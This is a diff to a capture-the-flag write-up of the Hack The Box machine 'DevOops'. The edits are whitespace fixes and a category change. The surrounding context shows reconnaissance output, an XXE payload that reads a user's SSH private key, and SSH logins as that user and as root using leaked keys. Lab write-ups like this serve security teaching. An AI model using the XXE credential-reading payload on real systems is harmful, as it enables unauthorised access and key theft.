@@ -6,7 +6,7 @@ comments: true
 author: BoiteAKlou
 categories:
 - "Writeup"
-- "Web"
+- "Pentest"
 ---
 
 
@@ -34,12 +34,12 @@ Nmap is a very powerful tool offering a lot of features and options that can be 
 ```bash
 boiteaklou@kali:/DevOops$ nmap -A -v 10.10.10.91
     22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
-    | ssh-hostkey: 
+    | ssh-hostkey:
     |   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
     |   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
     |_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
     5000/tcp open  http    Gunicorn 19.7.1
-    | http-methods: 
+    | http-methods:
     |_  Supported Methods: HEAD OPTIONS GET
     |_http-server-header: gunicorn/19.7.1
     |_http-title: Site doesn't have a title (text/html; charset=utf-8).
@@ -81,7 +81,7 @@ GENERATED WORDS: 4612
 ---- Scanning URL: http://10.10.10.91:5000/ ----
 + http://10.10.10.91:5000/feed (CODE:200|SIZE:546263)                                                                                               
 + http://10.10.10.91:5000/upload (CODE:200|SIZE:347)                                                                                                
-                                                                                                                                                    
+
 -----------------
 END_TIME: Thu Oct 11 23:22:22 2018
 DOWNLOADED: 4612 - FOUND: 2
@@ -94,7 +94,7 @@ Good news! Upload features are generally poorly secured inside web applications.
 
 ## From XXE to User access
 
-**Xml eXternal Entities** is an exploit based on weakly configured XML parsers that allow arbitrary file reading on the webserver. 
+**Xml eXternal Entities** is an exploit based on weakly configured XML parsers that allow arbitrary file reading on the webserver.
 
 Since this web application wants us to upload XML files, it seemed natural to me to test this vulnerability.
 
@@ -120,7 +120,7 @@ Here's the payload I used:
 ```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE foo [
-<!ELEMENT foo ANY> 
+<!ELEMENT foo ANY>
 <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
 <Book>
     <Author>BoiteAKlou</Author>
@@ -142,7 +142,7 @@ Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
 60 updates are security updates.
 
 Last login: Thu Oct 11 17:27:36 2018 from 10.10.12.226
-roosa@gitter:~$ cat user.txt 
+roosa@gitter:~$ cat user.txt
 c5808e[..]ecc67b
 ```
 Now things are getting serious...
@@ -222,7 +222,7 @@ Permissions 0664 for 'resources/integration/authcredentials.key' are too open.
 It is required that your private key files are NOT accessible by others.
 This private key will be ignored.
 Load key "resources/integration/authcredentials.key": bad permissions
-root@localhost's password: 
+root@localhost's password:
 ```
 
 SSH refuses to use this key because permissions are too open. We can fix this with `chmod 0600 resources/integration/authcredentials.key` and try to connect again.
@@ -239,7 +239,7 @@ Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
 60 updates are security updates.
 
 Last login: Fri Oct 12 04:48:17 2018 from 10.10.13.23
-root@gitter:~# 
+root@gitter:~#
 ```
 
 Bingo! Enjoy the flag :wink:
